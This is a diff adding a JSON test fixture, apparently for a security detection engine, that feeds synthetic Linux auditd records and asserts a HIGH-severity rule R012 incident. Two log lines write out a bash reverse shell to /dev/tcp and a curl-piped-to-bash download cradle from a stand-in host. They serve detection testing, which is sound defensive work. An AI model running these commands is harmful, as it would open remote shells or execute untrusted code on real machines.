@@ -1,0 +1,48 @@
+{
+  "name": "r012-linux-shell-abuse",
+  "description": "R012: auditd EXECVE records with a reverse shell (/dev/tcp) and a curl|bash download-execute cradle. Expects R012 HIGH incident (alert-only; no process-kill playbook exists). Benign execs (ls, systemctl) must not match.",
+  "base_time": "2026-11-13T10:00:00Z",
+  "requires_rules": [
+    "R012"
+  ],
+  "sources": [
+    {
+      "source_type": "LINUX_AUDITD",
+      "hostname": "SRV-LIN-01",
+      "lines": [
+        {
+          "offset_seconds": 0,
+          "raw": "type=EXECVE msg=audit(1763032800.100:1001): argc=3 a0=\"/bin/ls\" a1=\"-la\" a2=\"/var/log\""
+        },
+        {
+          "offset_seconds": 5,
+          "raw": "type=EXECVE msg=audit(1763032805.100:1002): argc=2 a0=\"/usr/bin/systemctl\" a1=\"status\" sshd"
+        },
+        {
+          "offset_seconds": 10,
+          "raw": "type=EXECVE msg=audit(1763032810.100:1003): argc=4 a0=\"/bin/bash\" a1=\"-c\" a2=\"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\""
+        },
+        {
+          "offset_seconds": 15,
+          "raw": "type=EXECVE msg=audit(1763032815.100:1004): argc=3 a0=\"/usr/bin/curl\" a1=\"-s http://evil.example/p.sh | bash\" a2=\"-o\""
+        }
+      ]
+    }
+  ],
+  "assert": {
+    "expect_incidents": [
+      {
+        "rule_id": "R012",
+        "min_severity": "HIGH",
+        "min_count": 1
+      }
+    ],
+    "expect_entity_risk": [
+      {
+        "entity_type": "HOST",
+        "value": "srv-lin-01",
+        "min_score": 20
+      }
+    ]
+  }
+}
